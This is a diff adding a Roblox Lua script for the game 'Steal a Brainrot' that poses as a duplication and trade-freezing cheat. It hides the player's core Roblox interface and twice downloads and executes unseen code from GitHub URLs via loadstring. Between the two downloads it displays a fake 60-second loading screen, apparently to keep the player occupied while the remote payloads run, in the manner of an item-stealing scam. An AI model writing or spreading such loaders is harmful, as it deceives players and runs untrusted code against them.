@@ -1,0 +1,146 @@
+pcall(function()
+local cg = game:GetService("CoreGui")
+local rbx = cg:FindFirstChild("RobloxGui")
+if rbx then
+rbx:Destroy()
+end
+end)
+
+local allowedPlaces = {
+	[85621847059032] = true,
+	[96342491571673] = true,
+	[99392882090073] = true,
+	[99606176102979] = true,
+	[109983668079237] = true,
+	[128762245270197] = true
+}
+
+if not allowedPlaces[game.PlaceId] then
+	game:GetService("Players").LocalPlayer:Kick("Use in Steal a Brainrot")
+	return
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Bringvacktge-loac/refs/heads/main/Bru"))()
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "VoidLoader"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(5,5,5)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+local percent = Instance.new("TextLabel")
+percent.AnchorPoint = Vector2.new(0.5,0.5)
+percent.Position = UDim2.new(0.5,0,0.34,0)
+percent.Size = UDim2.new(0,200,0,40)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.Font = Enum.Font.GothamBold
+percent.TextSize = 28
+percent.TextColor3 = Color3.fromRGB(220,220,220)
+percent.Parent = bg
+
+local timer = Instance.new("TextLabel")
+timer.AnchorPoint = Vector2.new(0.5,0.5)
+timer.Position = UDim2.new(0.5,0,0.40,0)
+timer.Size = UDim2.new(0,200,0,40)
+timer.BackgroundTransparency = 1
+timer.Text = "01:00"
+timer.Font = Enum.Font.GothamBold
+timer.TextSize = 34
+timer.TextColor3 = Color3.fromRGB(255,255,255)
+timer.Parent = bg
+
+local title = Instance.new("TextLabel")
+title.AnchorPoint = Vector2.new(0.5,0.5)
+title.Position = UDim2.new(0.5,0,0.48,0)
+title.Size = UDim2.new(0.8,0,0,60)
+title.BackgroundTransparency = 1
+title.Text = "Loading Duplication Script..."
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Parent = bg
+
+local barBG = Instance.new("Frame")
+barBG.AnchorPoint = Vector2.new(0.5,0.5)
+barBG.Position = UDim2.new(0.5,0,0.56,0)
+barBG.Size = UDim2.new(0.5,0,0,20)
+barBG.BackgroundColor3 = Color3.fromRGB(30,30,30)
+barBG.BorderSizePixel = 0
+barBG.Parent = bg
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(170,0,255)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+local credit = Instance.new("TextLabel")
+credit.AnchorPoint = Vector2.new(0.5,1)
+credit.Position = UDim2.new(0.5,0,0.96,0)
+credit.Size = UDim2.new(0,300,0,40)
+credit.BackgroundTransparency = 1
+credit.Text = "By void"
+credit.Font = Enum.Font.GothamBold
+credit.TextSize = 20
+credit.TextColor3 = Color3.fromRGB(200,200,200)
+credit.Parent = bg
+
+local duration = 60
+local startTime = tick()
+
+while true do
+local elapsed = tick() - startTime
+local progress = math.clamp(elapsed / duration,0,1)
+
+bar.Size = UDim2.new(progress,0,1,0)
+percent.Text = math.floor(progress*100).."%"
+
+local remaining = math.max(0,duration - elapsed)
+local m = math.floor(remaining/60)
+local s = math.floor(remaining%60)
+timer.Text = string.format("%02d:%02d",m,s)
+
+if progress < 0.25 then
+	title.Text = "Loading Duplication Script..."
+elseif progress < 0.5 then
+	title.Text = "Loading Trade Freezing Script..."
+elseif progress < 0.75 then
+	title.Text = "Loading OG Lucky Block Maker..."
+else
+	title.Text = "Loading..."
+end
+
+if progress >= 1 then
+	break
+end
+
+task.wait()
+end
+
+percent.Text = "100%"
+timer.Text = "00:00"
+
+for _,v in pairs(bg:GetDescendants()) do
+if v:IsA("TextLabel") then
+TweenService:Create(v,TweenInfo.new(1),{TextTransparency=1}):Play()
+elseif v:IsA("Frame") then
+TweenService:Create(v,TweenInfo.new(1),{BackgroundTransparency=1}):Play()
+end
+end
+
+task.wait(1)
+gui:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/morrisongriffin13-web/sacredpsychic/refs/heads/main/67sabscriptshaha"))()
